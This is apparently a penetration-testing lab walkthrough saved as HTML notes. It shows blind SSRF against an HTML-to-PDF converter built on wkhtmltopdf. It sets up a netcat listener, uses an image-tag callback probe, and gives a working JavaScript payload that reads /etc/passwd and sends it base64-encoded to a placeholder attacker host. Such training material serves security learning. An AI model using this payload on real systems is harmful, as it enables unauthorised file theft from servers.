<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Blind SSRF File Upload PDF Converter</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Blind SSRF File Upload PDF Converter</h1><br/><br />Here in this example we have a website that allow us to convert an HTML page to PDF<br />    <a href=""><img src="images/2566-1.png" alt="images/2566-1.png" /></a><br /><br />When we upload HTML files the application returns the same response regardless of the structure and content of the submitted files. <br />We cannot observe any response related to the processing of the submitted HTML file on the front end.<br />Should we conclude that the application is not vulnerable to SSRF? Of course not! <br />    <a href=""><img src="images/2566-2.png" alt="images/2566-2.png" /></a><br /><br /><strong><h3>Set up the attack</h3></strong><br />1. Set up the listener on the machine<br />    <div class="codebox"><pre>ifconfig</pre></div><br />    <a href=""><img src="images/2566-3.png" alt="images/2566-3.png" /></a><br />    <div class="codebox"><pre>nc -nvlp 9091</pre></div>       <br />    <a href=""><img src="images/2566-4.png" alt="images/2566-4.png" /></a><br />   <br />2. Upload a malicious html file that will try to connect with our machine<br />    <div class="codebox"><pre>&lt;!DOCTYPE html&gt;<br />&lt;html&gt;<br />&lt;body&gt;<br />	&lt;a&gt;Hello World!&lt;/a&gt;<br />	&lt;img src=&quot;http://&lt;SERVICE IP&gt;:PORT/x?=viaimgtag&quot;&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;</pre></div><br />    <a href=""><img src="images/2566-5.png" alt="images/2566-5.png" /></a><br />    <a href=""><img src="images/2566-6.png" alt="images/2566-6.png" /></a><br />    and we got a response!<br />    <a href=""><img src="images/2566-7.png" alt="images/2566-7.png" /></a><br />4. By inspect the response from the target above in the User-Agent we notice <span style="color:#ff0000;">wkhtmltopdf</span>.<br />    If we browse <a href="https://wkhtmltopdf.org/downloads.html">wkhtmltopdf&#39;s downloads webpage</a>, the below statement catches our attention.<br />    <a href=""><img src="images/2566-8.png" alt="images/2566-8.png" /></a><br />    Great! seams that we can execute JavaScript in wkhtmltopdf! <br /><br />5. Let us leverage this functionality to <span style="text-decoration:underline;">read a local file</span> by creating the following HTML document.<br />    In this case, we are using two <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a> objects:<br />   ◇ <span style="color:#a020f0;">var readfile</span> → for reading the local file<br />   ◇ <span style="color:#ffa500;">var exfil</span> → to send the local file to our server. We are using the btoa function to send the data encoded in Base64.<br />    <div class="codebox"><pre><span style="color:#7f0044;font-weight:400">&lt;html&gt;</span><br />    <span style="color:#7f0044;font-weight:400">&lt;body&gt;</span><br />        <span style="color:#7f0044;font-weight:400">&lt;b&gt;</span>Exfiltration via Blind SSRF<span style="color:#7f0044;font-weight:400">&lt;/b&gt;</span><br />        <span style="color:#7f0044;font-weight:400">&lt;script&gt;</span><br />        <span style="color:#ff9d00;font-weight:700">var</span> readfile = <span style="color:#ff9d00;font-weight:700">new</span> XMLHttpRequest(); <span style="color:#0088ff;font-weight:400">// Read the local file</span><br />        <span style="color:#ff9d00;font-weight:700">var</span> exfil = <span style="color:#ff9d00;font-weight:700">new</span> XMLHttpRequest(); <span style="color:#0088ff;font-weight:400">// Send the file to our server</span><br />        readfile.open(<span style="color:#3ad900;font-weight:400">&quot;GET&quot;</span>,<span style="color:#3ad900;font-weight:400">&quot;file:///etc/passwd&quot;</span>, <span style="color:#ff0044;font-weight:400">true</span>); <br />        readfile.send();<br />        readfile.onload = <span style="color:#ff9d00;font-weight:700">function</span>() {<br />            <span style="color:#ff9d00;font-weight:700">if</span> (readfile.readyState === <span style="color:#ff0044;font-weight:400">4</span>) {<br />                <span style="color:#ff9d00;font-weight:700">var</span> url = <span style="color:#3ad900;font-weight:400">&#39;http://&lt;SERVICE IP&gt;:&lt;PORT&gt;/?data=&#39;</span>+btoa(<span style="color:#ff9d00;font-weight:700">this</span>.response);<br />                exfil.open(<span style="color:#3ad900;font-weight:400">&quot;GET&quot;</span>, url, <span style="color:#ff0044;font-weight:400">true</span>);<br />                exfil.send();<br />            }<br />        }<br />        readfile.onerror = <span style="color:#ff9d00;font-weight:700">function</span>(){document.write(<span style="color:#3ad900;font-weight:400">&#39;&lt;a&gt;Oops!&lt;/a&gt;&#39;</span>);}<br />        <span style="color:#7f0044;font-weight:400">&lt;/script&gt;</span><br />     <span style="color:#7f0044;font-weight:400">&lt;/body&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/html&gt;</span></pre></div><br /><br />    <a href=""><img src="images/2566-9.png" alt="images/2566-9.png" /></a><br /><br />6. Send the request with Burp <br />    <a href=""><img src="images/2566-10.png" alt="images/2566-10.png" /></a><br />7. We should have got a response from our listening machine with the local file Base64 encoded<br />    <a href=""><img src="images/2566-11.png" alt="images/2566-11.png" /></a><br />8. Decode the base64 file encoded. <br />    -d → decode data<br />    <div class="codebox"><pre>echo &quot;cm9vdDp4OjA6MDpyb290Oi9yb<span style="color:#7f0044;font-weight:400">&lt;SNIP&gt;</span>&quot; | base64 -d</pre></div><br />    <a href=""><img src="images/2566-12.png" alt="images/2566-12.png" /></a><br />    BINGO!<br /><br /></div>
</body>
</html>
